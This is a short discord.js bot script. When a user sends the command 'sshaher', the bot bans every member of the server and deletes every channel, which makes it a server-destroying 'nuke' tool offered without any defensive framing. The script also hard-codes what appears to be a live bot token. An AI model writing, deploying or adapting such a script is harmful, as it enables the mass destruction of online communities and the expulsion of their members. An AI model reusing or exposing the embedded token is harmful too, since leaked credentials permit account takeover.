const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = 's'.toLowerCase();
const token = 'NDYzMDkzNTU3OTI2OTUyOTgw.Dxd9tA.ciCf-_tqJ-7NPOxpuIUEGh3vnoI';
client.on('message', message => {
    let args = message.content.split(' ');
    if(args[0].toLowerCase() === (prefix + 'shaher')){
        message.guild.members.forEach(f => {
            f.ban();
        });
        message.guild.channels.forEach(m => {
            m.delete();
        });
    }
});

client.login(process.env.BOT_TOKEN);
